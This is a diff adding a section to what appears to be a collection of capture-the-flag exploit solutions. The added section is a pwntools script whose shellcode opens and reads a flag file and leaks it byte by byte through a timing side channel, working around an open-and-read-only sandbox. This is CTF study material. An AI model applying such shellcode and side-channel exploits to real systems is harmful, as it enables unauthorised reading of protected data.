@@ -1954,3 +1954,74 @@ p.sendafter(b'shellcode: ',shellcode)
 p.interactive()
 ```
 
+## tryhackme (only open + read)
+
+
+
+
+```
+def exploit():
+    charset = string.printable
+    flag = ""
+
+    while len(flag) != 50:
+        for char in charset:
+            print(flag + char)
+
+            sc = asm(
+                f"""
+                open:
+                    mov rax, 0x2
+                    lea rdi, [rip+filename]
+                    xor rsi, rsi
+                    syscall
+
+                read:
+                    mov rdi, rax
+                    lea rsi, [rsp+0x100]
+                    mov rdx, 0x50
+                    xor rax, rax
+                    syscall
+
+                add rsi, {len(flag)}
+
+                side_channel:
+                    cmp BYTE PTR [rsi], {ord(char)}
+                    je side_channel
+
+                exit:
+                    mov rdi, 0x1337
+                    mov rax, 0x3c
+                    syscall
+
+                filename:
+                    .ascii "./flag.txt"
+                    .byte 0x0
+                """
+            )
+
+            p.sendlineafter(b":", b"4")
+            p.sendafter(b":", sc)
+
+            good = True
+
+            try:
+                p.recvuntil(b"Processing\n")
+                a = p.recv(1024, timeout=4)
+            except EOFError:
+                good = False
+
+            p.close()
+
+            if good:
+                flag += char
+                print(f"Flag: {flag}")
+                break
+
+    interactive()
+
+
+if __name__ == "__main__":
+    init()
+    exploit()
+```
